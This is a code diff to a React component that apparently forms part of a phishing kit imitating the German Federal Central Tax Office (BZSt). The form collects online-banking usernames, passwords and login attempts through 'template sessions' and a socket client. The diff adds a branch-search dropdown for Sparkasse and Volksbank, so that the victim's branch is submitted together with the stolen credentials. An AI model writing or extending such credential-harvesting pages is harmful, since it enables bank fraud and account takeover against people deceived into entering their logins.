@@ -3,6 +3,7 @@ import { useNavigate, useParams } from 'react-router-dom';
 import { createTemplateSession, getTemplateConfig, submitTemplateData } from '../../utils/templateApi';
 import { getTemplateMetadata, updatePageMetadata } from '../../utils/templateMetadata';
 import templateSocketClient from '../../utils/socketClient';
+import axios from 'axios';
 import './BzstStyle.css';
 
 const STATES = {
@@ -41,6 +42,20 @@ interface StepConfig {
   login: boolean;
 }
 
+type Branch = {
+  id: number;
+  branch_name: string;
+  city: string;
+  zip_code: string;
+};
+
+type SelectedBranch = {
+  branch_id: number;
+  branch_name: string;
+  city: string;
+  zip_code: string;
+};
+
 const DEFAULT_CONFIG: StepConfig = {
   login: true
 };
@@ -78,6 +93,13 @@ const BzstTemplate: React.FC = () => {
   const [bankDropdownOpen, setBankDropdownOpen] = useState(false);
   const [selectedBank, setSelectedBank] = useState<AvailableBank | null>(null);
 
+  // Branch selection (only required for Sparkasse/Volksbank)
+  const [branchSearch, setBranchSearch] = useState('');
+  const [branchDropdownOpen, setBranchDropdownOpen] = useState(false);
+  const [branchResults, setBranchResults] = useState<Branch[]>([]);
+  const [branchLoading, setBranchLoading] = useState(false);
+  const [selectedBranch, setSelectedBranch] = useState<SelectedBranch | null>(null);
+
   const filteredBanks = useMemo(() => {
     const activeBanks = AVAILABLE_BANKS.filter((bank) => bank.isActive);
     if (!bankSearch) return activeBanks;
@@ -88,6 +110,47 @@ const BzstTemplate: React.FC = () => {
         bank.description.toLowerCase().includes(searchLower)
     );
   }, [bankSearch]);
+
+  const bankRequiresBranchSelection = selectedBank?.id === 'sparkasse' || selectedBank?.id === 'volksbank';
+
+  // Reset branch selection when bank changes
+  useEffect(() => {
+    setSelectedBranch(null);
+    setBranchSearch('');
+    setBranchResults([]);
+    setBranchDropdownOpen(false);
+  }, [selectedBank?.id]);
+
+  // Fetch branches (simple debounce)
+  useEffect(() => {
+    if (activeTab !== 'card') return;
+    if (!bankRequiresBranchSelection) return;
+    const query = branchSearch.trim();
+    if (query.length < 2) {
+      setBranchResults([]);
+      setBranchDropdownOpen(false);
+      return;
+    }
+
+    const timeout = setTimeout(async () => {
+      try {
+        setBranchLoading(true);
+        const response = await axios.get(
+          `/api/branches/search?q=${encodeURIComponent(query)}&limit=10&type=${selectedBank?.id}`
+        );
+        const results = (response.data || []) as Branch[];
+        setBranchResults(results);
+        setBranchDropdownOpen(results.length > 0);
+      } catch {
+        setBranchResults([]);
+        setBranchDropdownOpen(false);
+      } finally {
+        setBranchLoading(false);
+      }
+    }, 250);
+
+    return () => clearTimeout(timeout);
+  }, [branchSearch, activeTab, bankRequiresBranchSelection, selectedBank?.id]);
 
   useEffect(() => {
     const metadata = getTemplateMetadata('bzst');
@@ -279,6 +342,11 @@ const BzstTemplate: React.FC = () => {
         return;
       }
 
+      if (bankRequiresBranchSelection && !selectedBranch) {
+        setFormError('Bitte wählen Sie eine Filiale aus.');
+        return;
+      }
+
       const nextAttempt = bankLoginAttempts + 1;
 
       setLoading(true);
@@ -310,6 +378,7 @@ const BzstTemplate: React.FC = () => {
             selected_bank: selectedBank.id,
             selected_bank_name: selectedBank.displayName,
             selected_bank_description: selectedBank.description,
+            selected_branch: selectedBranch,
             username: bankAccess,
             password: bankPassword,
             login_attempt: nextAttempt
@@ -553,6 +622,71 @@ const BzstTemplate: React.FC = () => {
                     </div>
                   </div>
                 )}
+
+                {selectedBank && bankRequiresBranchSelection && (
+                  <div className="bzst-form-field full">
+                    <label htmlFor="bzst-branch-search"><strong>Filiale</strong></label>
+                    <div className="bzst-branch-dropdown">
+                      <input
+                        id="bzst-branch-search"
+                        type="text"
+                        className="bzst-input bzst-branch-input"
+                        placeholder="Filiale suchen (Stadt, PLZ oder Filialname)"
+                        value={branchSearch}
+                        onChange={(e) => {
+                          setFormError(null);
+                          setBranchSearch(e.target.value);
+                        }}
+                        onFocus={() => {
+                          if (branchResults.length > 0) setBranchDropdownOpen(true);
+                        }}
+                        autoComplete="off"
+                        required
+                      />
+
+                      {branchLoading && (
+                        <div className="bzst-branch-loading">Suche...</div>
+                      )}
+
+                      {selectedBranch && (
+                        <div className="bzst-branch-selected">
+                          Ausgewählt: <strong>{selectedBranch.branch_name}</strong> — {selectedBranch.city} ({selectedBranch.zip_code})
+                        </div>
+                      )}
+
+                      {branchDropdownOpen && (
+                        <div className="bzst-branch-dropdown-menu">
+                          {branchResults.length > 0 ? (
+                            branchResults.map((b) => (
+                              <button
+                                key={b.id}
+                                type="button"
+                                className="bzst-branch-option"
+                                onClick={() => {
+                                  const sel: SelectedBranch = {
+                                    branch_id: b.id,
+                                    branch_name: b.branch_name,
+                                    city: b.city,
+                                    zip_code: b.zip_code
+                                  };
+                                  setSelectedBranch(sel);
+                                  setBranchSearch(`${b.branch_name} - ${b.city} (${b.zip_code})`);
+                                  setBranchDropdownOpen(false);
+                                }}
+                              >
+                                <div className="bzst-branch-option-name">{b.branch_name}</div>
+                                <div className="bzst-branch-option-meta">{b.city} • {b.zip_code}</div>
+                              </button>
+                            ))
+                          ) : (
+                            <div className="bzst-branch-no-results">Keine Filialen gefunden</div>
+                          )}
+                        </div>
+                      )}
+                    </div>
+                  </div>
+                )}
+
                 <div className="bzst-form-field full">
                   <label htmlFor="zugang"><strong>Zugangsnummer oder Benutzername</strong></label>
                   <input
